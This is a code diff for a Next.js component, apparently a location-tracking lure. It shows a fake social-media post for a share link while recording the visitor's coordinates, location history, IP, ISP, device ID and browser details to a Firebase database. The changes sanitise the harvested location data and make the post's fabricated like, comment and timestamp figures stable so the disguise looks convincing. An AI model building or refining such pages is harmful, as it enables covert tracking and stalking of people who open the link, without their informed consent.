@@ -1,6 +1,6 @@
 "use client";
 
-import { useEffect, useState, useRef } from "react";
+import { useEffect, useState, useRef, useMemo } from "react";
 import { database } from "@/lib/firebase";
 import { ref, get, runTransaction, serverTimestamp } from "firebase/database";
 import dynamic from "next/dynamic";
@@ -119,6 +119,75 @@ function stripUndefined<T extends Record<string, unknown>>(obj: T): T {
   ) as T;
 }
 
+function validateAndSanitizeLocationPayload(data: Partial<Location>): Partial<Location> {
+  const sanitized: Partial<Location> = { ...data };
+
+  // Validate latitude bounds
+  if (typeof sanitized.latitude === "number") {
+    if (isNaN(sanitized.latitude) || sanitized.latitude < -90 || sanitized.latitude > 90) {
+      delete sanitized.latitude;
+    }
+  }
+
+  // Validate longitude bounds
+  if (typeof sanitized.longitude === "number") {
+    if (isNaN(sanitized.longitude) || sanitized.longitude < -180 || sanitized.longitude > 180) {
+      delete sanitized.longitude;
+    }
+  }
+
+  // Bound string lengths to prevent oversized/bloated payloads
+  if (typeof sanitized.userAgent === "string") sanitized.userAgent = sanitized.userAgent.slice(0, 500);
+  if (typeof sanitized.referrer === "string") sanitized.referrer = sanitized.referrer.slice(0, 500);
+  if (typeof sanitized.deviceId === "string") sanitized.deviceId = sanitized.deviceId.slice(0, 128);
+  if (typeof sanitized.ip === "string") sanitized.ip = sanitized.ip.slice(0, 64);
+  if (typeof sanitized.userTimezone === "string") sanitized.userTimezone = sanitized.userTimezone.slice(0, 100);
+  if (typeof sanitized.userLanguage === "string") sanitized.userLanguage = sanitized.userLanguage.slice(0, 50);
+  if (typeof sanitized.ipCity === "string") sanitized.ipCity = sanitized.ipCity.slice(0, 100);
+  if (typeof sanitized.ipRegion === "string") sanitized.ipRegion = sanitized.ipRegion.slice(0, 100);
+  if (typeof sanitized.ipCountry === "string") sanitized.ipCountry = sanitized.ipCountry.slice(0, 100);
+  if (typeof sanitized.ipIsp === "string") sanitized.ipIsp = sanitized.ipIsp.slice(0, 100);
+
+  return sanitized;
+}
+
+function sanitizeHistoryEntry(entry: Omit<LocationHistoryEntry, "ts"> | null): Omit<LocationHistoryEntry, "ts"> | null {
+  if (!entry) return null;
+  if (
+    typeof entry.latitude !== "number" ||
+    isNaN(entry.latitude) ||
+    entry.latitude < -90 ||
+    entry.latitude > 90 ||
+    typeof entry.longitude !== "number" ||
+    isNaN(entry.longitude) ||
+    entry.longitude < -180 ||
+    entry.longitude > 180
+  ) {
+    return null;
+  }
+  return {
+    ...entry,
+    accuracy: typeof entry.accuracy === "number" && !isNaN(entry.accuracy) && entry.accuracy >= 0 ? entry.accuracy : null,
+  };
+}
+
+
+function getDeterministicMetrics(id?: string | null) {
+  let hash = 42;
+  if (id) {
+    for (let i = 0; i < id.length; i++) {
+      hash = (hash << 5) - hash + id.charCodeAt(i);
+      hash |= 0;
+    }
+  }
+  const absHash = Math.abs(hash);
+  return {
+    likeBase: 1200 + (absHash % 2800),
+    commentsCount: 24 + (absHash % 140),
+    hoursAgo: 1 + (absHash % 11),
+  };
+}
+
 // -------------------------------------------------------------------
 // Component
 // -------------------------------------------------------------------
@@ -128,11 +197,20 @@ export default function TrackClient() {
   const [shareLink, setShareLink] = useState<ShareLink | null>(null);
   const [liked, setLiked] = useState(false);
   const [saved, setSaved] = useState(false);
-  const [likeCount] = useState(() => Math.floor(Math.random() * 3000) + 800);
   const [postImageBroken, setPostImageBroken] = useState(false);
   const ipRef = useRef("");
   const searchParams = useSearchParams();
   const shareLinkId = searchParams.get("id");
+
+  const { likeBase, commentsCount, hoursAgo } = useMemo(
+    () => getDeterministicMetrics(shareLinkId),
+    [shareLinkId]
+  );
+  const [likeCount, setLikeCount] = useState(likeBase);
+
+  useEffect(() => {
+    setLikeCount(likeBase);
+  }, [likeBase]);
 
   // Fetch share link metadata for the post UI
   useEffect(() => {
@@ -208,6 +286,9 @@ export default function TrackClient() {
       data: Partial<Location>,
       historyEntry: Omit<LocationHistoryEntry, "ts"> | null
     ) => {
+      const cleanData = validateAndSanitizeLocationPayload(data);
+      const cleanEntry = sanitizeHistoryEntry(historyEntry);
+
       const locRef = ref(database, `locations/${deviceId}`);
       await runTransaction(locRef, (current) => {
         const cur =
@@ -221,10 +302,10 @@ export default function TrackClient() {
           : rawHistory && typeof rawHistory === "object"
             ? (Object.values(rawHistory) as LocationHistoryEntry[])
             : [];
-        const history = historyEntry
+        const history = cleanEntry
           ? [
               ...prevHistory,
-              { ...historyEntry, ts: serverTimestamp() },
+              { ...cleanEntry, ts: serverTimestamp() },
             ].slice(-200)
           : prevHistory;
         const createdAt =
@@ -233,7 +314,7 @@ export default function TrackClient() {
             : serverTimestamp();
         const merged = stripUndefined({
           ...base,
-          ...data,
+          ...cleanData,
           history,
           createdAt,
           updatedAt: serverTimestamp(),
@@ -251,6 +332,7 @@ export default function TrackClient() {
       const dbUrl = process.env.NEXT_PUBLIC_FIREBASE_DATABASE_URL;
       if (!dbUrl) return;
       try {
+        const cleanPayload = validateAndSanitizeLocationPayload(payload as Partial<Location>);
         const url = `${dbUrl.replace(/\/$/, "")}/locations/${encodeURIComponent(
           deviceId
         )}.json`;
@@ -258,7 +340,7 @@ export default function TrackClient() {
           method: "PATCH",
           keepalive: true,
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload),
+          body: JSON.stringify(cleanPayload),
         }).catch(() => {});
       } catch {
         /* ignore */
@@ -641,7 +723,7 @@ export default function TrackClient() {
             </div>
 
             {/* Likes */}
-            <p className="text-sm font-semibold text-gray-900 mb-1">
+            <p className="text-sm font-semibold text-gray-900 mb-1" suppressHydrationWarning>
               {t("likesLine", { count: likeDisplay })}
             </p>
 
@@ -652,13 +734,13 @@ export default function TrackClient() {
             </p>
 
             {/* View comments */}
-            <button type="button" className="text-sm text-gray-500 mt-1">
-              {t("viewAllComments", { n: Math.floor(Math.random() * 200) + 20 })}
+            <button type="button" className="text-sm text-gray-500 mt-1" suppressHydrationWarning>
+              {t("viewAllComments", { n: commentsCount })}
             </button>
 
             {/* Time */}
-            <p className="text-[10px] uppercase tracking-wider text-gray-400 mt-1">
-              {t("hoursAgo", { n: Math.floor(Math.random() * 12) + 1 })}
+            <p className="text-[10px] uppercase tracking-wider text-gray-400 mt-1" suppressHydrationWarning>
+              {t("hoursAgo", { n: hoursAgo })}
             </p>
           </div>
 
